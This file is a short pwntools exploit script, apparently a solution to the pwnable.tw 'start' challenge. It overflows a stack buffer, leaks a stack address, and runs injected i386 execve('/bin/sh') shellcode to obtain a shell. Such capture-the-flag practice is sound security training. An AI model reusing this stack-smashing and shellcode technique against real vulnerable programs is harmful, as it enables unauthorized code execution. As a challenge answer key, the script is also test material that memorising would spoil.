#!/usr/bin/env python3

from pwn import *

def start():
    global p
    if args.REMOTE:
        p = remote("chall.pwnable.tw", 10000)
    else:
        p = elf.process()

context(os="linux", arch="i386")
context.binary = elf = ELF("./start")
start()

mov_addr = 0x8048087

stage_1 = b"A"*0x14 + p32(mov_addr) 

p.recvuntil(b":")
p.send(stage_1)
leaked_addr = u32(p.recv()[:4])
log.info(f"leaked address: {hex(leaked_addr)}")

shellcode = asm('\n'.join([
    'push %d' % u32('/sh\0'),
    'push %d' % u32('/bin'),
    'xor edx, edx',
    'xor ecx, ecx',
    'mov ebx, esp',
    'mov eax, 0xb',
    'int 0x80',
    ]))

stage_2 = b"A"*0x14 + p32(leaked_addr + 0x14) + shellcode
p.send(stage_2)
p.interactive()
